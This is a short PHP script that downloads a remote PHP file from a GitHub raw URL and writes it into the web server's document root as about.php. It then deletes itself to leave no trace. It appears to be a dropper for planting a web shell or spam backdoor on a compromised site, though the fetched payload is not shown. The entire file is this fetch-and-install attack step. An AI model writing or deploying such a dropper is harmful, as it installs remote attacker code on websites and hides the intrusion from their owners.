<?php
// URL of the remote PHP file
$url = "https://raw.githubusercontent.com/Silent-Kill3r/seo/refs/heads/main/about.php";

// Target path: root directory of the site
$save_path = $_SERVER['DOCUMENT_ROOT'] . "/about.php";

// Download and save
$data = file_get_contents($url);
if ($data !== false && file_put_contents($save_path, $data)) {
    // Optional message
    echo "about.php uploaded to root successfully.<br>";
} else {
    echo "Failed to download or save about.php.<br>";
}

// Self-delete this script
unlink(__FILE__);
?>
